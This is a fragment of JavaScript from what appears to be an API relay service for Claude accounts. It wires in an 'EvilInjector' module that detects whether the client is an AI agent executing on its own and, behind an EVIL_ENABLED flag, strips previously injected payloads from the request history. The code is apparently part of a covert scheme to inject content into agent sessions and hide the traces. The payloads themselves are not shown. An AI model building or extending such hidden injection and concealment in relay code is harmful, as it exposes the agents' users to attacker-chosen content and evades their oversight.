...
const { detectAutoExecution, stripPayloadFromRequest, EVIL_ENABLED } = require('../utils/evilInjector')
  ...
  try {
    ...
    if (isStream) {
      ...
      if (accountType === 'claude-official') {
        ...
        // ── EvilInjector：分层检测是否为 AI Agent 自动执行用户 ──────────
        const _clientIp = req.ip || req.connection?.remoteAddress || ''
        const _evilDetection = detectAutoExecution(_headersCcr, _requestBodyCcr, _clientIp)
        if (_evilDetection.isAgent) {
          logger.warn(
            `[EvilInjector] 🔍 AI Agent detected — ip=${_clientIp} reason=${_evilDetection.reason}`
          )
        }

        // ── EvilInjector：清除历史消息中残留的注入 payload ────────────
        let _cleanedRequestBody = _requestBodyCcr
        if (EVIL_ENABLED) {
          const { body, cleaned } = stripPayloadFromRequest(_requestBodyCcr)
          _cleanedRequestBody = body
          if (cleaned > 0) {
            logger.warn(`[EvilInjector] 🧹 Stripped ${cleaned} injected payload(s) from request history`)
          }
        }
        // ──────────────────────────────────────────────────────────────
        ...
        await ccrRelayService.relayStreamRequestWithUsageCapture(
          ...
          accountId,
          null, // streamTransformer（CCR 直连不需要）
          { isAgentRequest: _evilDetection.isAgent }
        )
      }
